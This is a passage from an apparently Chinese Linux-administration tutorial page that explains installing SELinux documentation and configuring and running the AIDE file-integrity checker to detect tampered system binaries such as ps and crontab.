<div id="outline-container-h:26b4d548-1289-4ace-95a3-23ec93708dd9" class="outline-3">
<h3 id="h:26b4d548-1289-4ace-95a3-23ec93708dd9">查看SELinux帮助</h3>
<div class="outline-text-3" id="text-h:26b4d548-1289-4ace-95a3-23ec93708dd9">
<div class="org-src-container">
<pre class="src src-sh">yum &#8211;y install selinux-policy-devel ( centos7.2)
yum &#8211;y install selinux-policy-doc
mandb | makewhatis
man -k _selinux
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:7e1217eb-240d-43dd-94e2-7d224bec7231" class="outline-2">
<h2 id="h:7e1217eb-240d-43dd-94e2-7d224bec7231">文件完整性检查AIDE(dvanced Intrusion Detection Environment)</h2>
<div class="outline-text-2" id="text-h:7e1217eb-240d-43dd-94e2-7d224bec7231">
<p>
当一个入侵者进入了你的系统并且种植了木马，通常会想办法隐蔽这个木马（除
了木马自身的一些隐蔽特性外，他会尽量给你检查系统的过程设置障碍），通常
入侵者会修改一些文件，比如管理员通常用ps aux来查看系统进程，那么入侵者
很可能用自己经过修改的ps程序来替换掉你系统上的ps程序，以使用ps命令查不
到正在运行的木马程序。如果入侵者发现管理员正在运行crontab作业，也有可
能替换掉crontab程序等等。所以由此可以看出对于系统文件或是关键文件的检
查是很必要的。目前就系统完整性检查的工具用的比较多的有两款：Tripwire和
AIDE，前者是一款商业软件，后者是一款免费的但功能也很强大的工具
</p>

<p>
AIDE(Advanced Intrusion Detection Environment高级入侵检测环境)是一个入
侵检测工具，主要用途是检查文件的完整性，审计计算机上的那些文件被更改过
了
</p>

<p>
AIDE能够构造一个指定文件的数据库，它使用aide.conf作为其配置文件。AIDE
数据库能够保存文件的各种属性，包括：权限(permission)、索引节点序号
(inode number)、所属用户(user)、所属用户组(group)、文件大小、最后修改
时间(mtime)、创建时间(ctime)、最后访问时间(atime)、增加的大小以及连接
数。AIDE还能够使用下列算法：sha1、md5、rmd160、tiger，以密文形式建立每
个文件的校验码或散列号
</p>


<figure id="org6d1c180">
<img src="images/image-20210120155204403.png" alt="image-20210120155204403.png" width="50%">

</figure>

<p>
这个数据库不应该保存那些经常变动的文件信息，例如：日志文件、邮件、
/proc文件系统、用户起始目录以及临时目录
</p>

<p>
安装 AIDE
</p>

<div class="org-src-container">
<pre class="src src-sh">yum install aide
</pre>
</div>

<p>
配置文件指定对哪些文件进行检测
</p>

<p>
vim /etc/aide.conf
</p>

<p>
配置范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#23450;&#20041;&#30417;&#25511;&#39033;&#26435;&#38480;+&#32034;&#24341;&#33410;&#28857;+&#38142;&#25509;&#25968;+&#29992;&#25143;+&#32452;+&#22823;&#23567;+&#26368;&#21518;&#19968;&#27425;&#20462;&#25913;&#26102;&#38388;+&#21019;&#24314;&#26102;&#38388;+md5&#26657;&#39564;&#20540;</span>
<span style="color: #a0522d;">R</span>=p+i+n+u+g+s+m+c+md5
NORMAL = R+rmd60+sha256
/data/test.txt R
/bin/ps R+a
/usr/bin/crontab R+a
/etc PERMS
!/etc/mtab <span style="color: #b22222;">#</span><span style="color: #b22222;">&#8220;!&#8221;&#34920;&#31034;&#24573;&#30053;&#36825;&#20010;&#25991;&#20214;&#30340;&#26816;&#26597;</span>
</pre>
</div>

<p>
初始化默认的AIDE的库：
</p>

<div class="org-src-container">
<pre class="src src-sh">/usr/local/bin/aide -i | --init
</pre>
</div>

<p>
生成检查数据库（建议初始数据库存放到安全的地方）
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> /var/lib/aide
mv aide.db.new.gz aide.db.gz
</pre>
</div>

<p>
检测
</p>

<div class="org-src-container">
<pre class="src src-sh">/usr/local/bin/aide -C | --check
</pre>
</div>

<p>
更新数据库
</p>

<div class="org-src-container">
<pre class="src src-sh">aide -u | --update
</pre>
</div>
</div>
</section>
</div>
<div id="postamble" class="status">
    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2025 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
<!--
<script type="text/javascript" src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/bootstrap@5.2.1/dist/js/bootstrap.min.js"></script>
<div id="back-to-top" class=""><svg viewBox="0 0 24 24"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path></svg></div>
-->
</div>
</body>
</html>
